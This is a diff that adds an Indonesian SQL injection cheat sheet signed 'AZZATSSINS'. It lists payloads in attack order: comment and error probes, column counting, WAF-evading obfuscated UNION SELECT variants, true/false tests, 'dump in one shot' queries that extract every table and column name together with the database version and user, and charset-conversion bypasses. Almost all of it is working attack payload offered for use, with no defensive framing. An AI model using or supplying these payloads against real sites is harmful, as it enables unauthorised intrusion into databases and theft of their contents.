@@ -1,0 +1,176 @@
+=============================================
+========= [ ! ] AZZATSSINS [ ! ] ============
+=============================================
+
+Note:
+Semua String Bypass Di Bawah, Saya Ambil Referensi Dari Berbagai Sumber (youtube, group SQLi FB, Forum, DLL)
+
+Thx : For ALL Injector
+
+# pertama kita cek comentingnya/errornya
+'--
+'--+
+'+--+
+')--
+')--+
+')+--+
+'))--+
+')))--+
+'%23
+'%60
+'%90
+'/*
+';%00
+"-- -
+"--+-
+"%23
+")-- -
+")--+-
+"))--+-
+";%00
+") ;%00
+"));%00
+"%60
+"%90
+
+
+# kemudian kita cari column nya
+order+by
+group+by
+order/**/by
+order/**_**/by
+/*!42247order*//**//*!42247by*/
+%0aorder%0aby%0a
+
+
+# kemudian kita cari column yg vuln
+union+select
+union/**/select
+union/**_**/select
+/*!42247union*//**//*!42247select*/
+%0aunion%0aselect
+union+distinct+select
+union+distinctROW+select
+UNIunionON+SELselectECT
+uni<on+sel<ect
+uni<>on+sel<>ect
+Union+–+Select
+union(/*!/**/SeleCT*/+1,2,3)
+/**_**/UnIoN(SeLeCt+1,2,3)
+union(select+(1),(2),(3))
+UnIoN%A0SeLeCt*FrOm( SeLeCt 1)a join
+UnIoN%A0SeLeCt+1,2,3,~4,~5
+UnIoN%A0SeLeCt+1,2,3,.4,.5
+UnIoN%A0SeLeCt+1,2,3,'4','5'
+"9e0UnIoN+SeLeCt
+UnIoN+SeLeCt%74
+The Methods
+.
+id=1.unioN/**/distinct%20%73eleCt""a
+id=1%.0unioN/**/distinct%20%73eleCt+-!~
+id=1%""unioN/**/distinct%20%73eleCt@$%
+id=1%''unioN/**/distinct%20%73eleCt@%C0%
+id=1-.0unioN/**/distinct%20%73eleCt@%C0/
+id=1=\NunioN/**/distinct%20%73eleCt@%FF|
+id=1<0.unioN/**/distinct%20%73eleCt@=
+id=1>0.unioN/**/distinct%20%73eleCt~.
+id=1e0unioN/**/distinct%20%73eleCt""$
+id=1^0.unioN/**/distinct%20%73eleCt!~
+id=1|""unioN/**/distinct%20%73eleCt\N$
+id=1|''unioN/**/distinct%20%73eleCt\N%FF
+id=1|.0unioN/**/distinct%20%73eleCt!@
+id=1|\NunioN/**/distinct%20%73eleCt""/
+and @x:=database() UnIoN SeLect 1,@x,3
+’UnI”On’+'SeL”ECT’
+union%23AZZATSSINS_AZZATSSINS_AZZATSSINS_AZZATSSINS%0Aselect
+union+select*from(select+1)a+join(select'AZZATSSINS')b+join+(select+version())c
+
+cth :
+id=1.unioN/**/distinct %73eleCt""a1,2,3``from.%20users``limit 0,1-- -
+id=1%.0unioN/**/distinct %73eleCt+-!~a1,2,3|''from%20.users-- -
+id=1%""unioN/**/distinct %73eleCt@$%a1,2,3|""from users-- -
+id=1%''unioN/**/distinct %73eleCt@%C0%a1,2,3^""from users-- -
+id=1-.0unioN/**/distinct %73eleCt@%C0/a1,2,3.1from users-- -
+id=1=\NunioN/**/distinct %73eleCt@%FF|a1,2,3""from users-- -
+id=1<0.unioN/**/distinct %73eleCt@=a1,2,3''from users-- -
+id=1>0.unioN/**/distinct %73eleCt~.a1,2,3 from users-- -
+id=1e0unioN/**/distinct %73eleCt""$a1,2,3 from users-- -
+id=1^0.unioN/**/distinct %73eleCt!~a1,2,3 from users-- -
+id=1|""unioN/**/distinct %73eleCt\N$a1,2,3 from users-- -
+id=1|''unioN/**/distinct %73eleCt\N%FFa1,2,3 from users-- -
+id=1|.0unioN/**/distinct %73eleCt!@a1,2,3 from users-- -
+id=1|\NunioN/**/distinct %73eleCt""/a1,2,3 from users-- -
+
+
+# cek false true nya
+and+0
+div+0
+and+false
+having+0
+having+1=0
+and+1=0
+limit 0
+" and '1'='1
+" and (1)=(1 
+where 1 /*!=*/ 2
+and 2>3
+/*!and/+1=0
+and(1)=(0)
+/*!aND*/+1+like+0
++and+2>3+
+and+(1)!=(0)
+and/**/0/**/
+and/**_**/0/**_**/
+and/**/false/**/
+and/**_**/false/**_**/
+/*!50000or*/1='1'
+/*!or*/1='1
+
+# sekarang coba kita dump/dios
+concat_ws(0x3c62723e,0x415a5a41545353494e53,schema(),version(),user(),(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x))
+
+concat_ws/**/(0x3c62723e,0x415a5a41545353494e53,database/**/(),version/**/(),user/**/(),(select%20concat/**/(@AZZATSSINS:=0x00,if((select%20count(*)%20/*!42247from*/%20/*!42247information_schema*/.columns%20/*!42247where*/%20/*!42247table_schema*/%20not%20like%200x696e666f726d6174696f6e5f736368656d61%20and%20@AZZATSSINS:=concat/**/(@AZZATSSINS,0x3c62723e,/*!42247table_name*/,0x3a,/*!42247column_name*/)),0x00,0x00),@AZZATSSINS)))
+
+(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)
+
++and@x:=concat+(@:=0,(select+count(*)/*!50000from*/information_schema.columns+where+table_schema=database()+and@:=concat+(@,0x3c6c693e,table_name,0x3a3a,column_name)),@)/*!50000UNION*/SELECT+
+
+export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)
+
+concat%0b(@c:=0x00,if((select%20count(*)%20from%20/*!50000information_schema*/.columns%20/*!50000where*/%20table_schema%20not%20like%200x696e666f726d6174696f6e5f736368656d61%20and%20@c:=concat%0b(@c,0x3c62723e,/*!50000table_name*/,0x2e,/*!50000column_name*/)),0x00,0x00),@c)
+
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
+
+
+replace(replace(replace(0x232425,0x23,@:=replace(replace(replace(replace(0x243c62723e253c62723e3c666f6e7420636f6c6f723d7265643e263c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d707572706c653e273c2f666f6e743e3c666f6e7420636f6c6f723d7265643e,0x24,0x3c62723e3c62723e3c666f6e7420636f6c6f723d677265656e3e415a5a41545353494e532057415320484552453c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e),0x25,version()),0x26,database()),0x27,user())),0x24,(select+count(*)+from+information_schema.columns+where+table_schema=database()+and@:=replace(replace(0x003c62723e2a,0x00,@),0x2a,table_name))),0x25,@)
+
+(select+(@a)+from+(select(@a:=0x00),(@tbl:=0x00),(@tbl_sc:=0x00),(select+(@a)+from+(information_schema.columns)where+(table_schema!='information_schema')+and(0x00)in(@a:=concat(@a,0x3c62723e,if(+(@tbl!=table_name),+Concat(0x3c62723e,@tbl_sc:=table_schema,'+::',@tbl:=table_name,'+(Rows+',(select+table_rows+from+information_schema.tables+where+table_schema=@tbl_sc+and+table_name=@tbl),')',column_name),+(column_name))))))a)
+
+#Bypass convert
+*convert(concat(schema()+using+ascii)
+ujis
+ucs2
+tis620
+swe7
+sjis
+macroman
+macce
+latin7
+latin5
+latin2
+koi8u
+koi8r
+keybcs2
+hp8
+geostd8
+gbk
+gb2132
+armscii8
+ascii
+binary
+cp1250
+big5
+cp1251
+cp1256
+cp1257
+cp850
